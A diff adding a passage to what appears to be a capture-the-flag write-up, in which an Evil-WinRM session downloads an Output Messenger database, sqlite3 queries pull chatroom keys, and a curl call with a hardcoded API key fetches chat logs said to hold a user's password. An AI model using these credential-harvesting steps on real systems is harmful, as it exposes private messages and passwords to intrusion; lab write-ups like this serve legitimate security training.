@@ -631,6 +631,73 @@ curl -sH 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Host: 127.0.0.1:14125' 
 
 We can see that the user `O.martinez` is in the `Chiefs_Marketing_chat` room, which is where we can find the password for the user.
 
+For that we need the `roomkey` of the room, which we can get from the `OM.db3` file found at the `C:\Users\O.martinez\AppData\Roaming\Output Messenger\JAAA\OM.db3` file, which is the database file used by the `Output Messenger` software to store the data.
+
+```powershell
+*Evil-WinRM* PS C:\Users\winrm_svc\appdata\roaming\Output Messenger\JAAA> dir
+
+
+    Directory: C:\Users\winrm_svc\appdata\roaming\Output Messenger\JAAA
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/25/2024   7:20 AM                Audios
+d-----        2/25/2024   7:20 AM                CalendarFiles
+d-----        2/25/2024   7:26 AM                Log
+d-----        2/25/2024   7:20 AM                MailInbox
+d-----        2/25/2024   7:20 AM                MailSent
+d-----        2/25/2024   7:20 AM                Received Files
+d-----        2/25/2024   7:20 AM                Screenshots
+d-----        2/25/2024   7:20 AM                Temp
+d-----        2/25/2024   7:20 AM                Theme
+-a----        2/25/2024   7:20 AM          29696 OM.db3
+-a----        2/25/2024   7:20 AM          13312 OT.db3
+
+
+*Evil-WinRM* PS C:\Users\winrm_svc\appdata\roaming\Output Messenger\JAAA> download OM.db3
+Info: Downloading C:\Users\winrm_svc\appdata\roaming\Output Messenger\JAAA\OM.db3 to OM.db3
+
+Info: Download successful!
+*
+```
+
+```bash
+sqlite3 OM.db3
+
+SQLite version 3.50.1 2025-06-06 14:52:32
+Enter ".help" for usage hints.
+
+sqlite> .tables
+om_chatroom               om_drive_files            om_preset_message
+om_chatroom_user          om_escape_message         om_reminder
+om_custom_group_new       om_hide_usergroup         om_settings
+om_custom_group_user_new  om_notes                  om_user_master
+om_custom_status          om_notes_user             om_user_photo
+
+sqlite> pragma table_info(om_chatroom);
+0|chatroom_id|INTEGER|1||1
+1|chatroom_name|NVARCHAR(50)|0||0
+2|chatroom_key|NVARCHAR(50)|0||0
+3|chatroom_new_name|NVARCHAR(100)|0||0
+4|photo_key|NVARCHAR(100)|0||0
+5|chatroom_new_key|NVARCHAR(100)|0||0
+6|chatroom_notification|BOOLEAN|0||0
+7|updated_date|DATETIME|0||0
+8|leave_room|BOOLEAN|0||0
+9|admin_only_chat|BOOLEAN|0||0
+10|last_message_date|DATETIME|0||0
+11|is_remote_server|BOOLEAN|0||0
+12|remote_server_id|INTEGER|0||0
+13|is_active|BOOLEAN|0||0
+14|last_message_id|NVARCHAR(50)|0||0
+15|pin_message|NTEXT|0||0
+
+sqlite> select chatroom_id,chatroom_name,chatroom_key from om_chatroom;
+1|General_chat|20240219160702@conference.com
+2|Chiefs_Marketing_chat|20240220014618@conference.com
+``` 
+
 ```bash
 curl -sX GET 'http://127.0.0.1:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&fromdate=2022/02/10&todate=2025/02/20' -H 'Host: 127.0.0.1:14125' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Accept: application/json, text/javascript, /;' | jq '.logs' -r |html2text
 
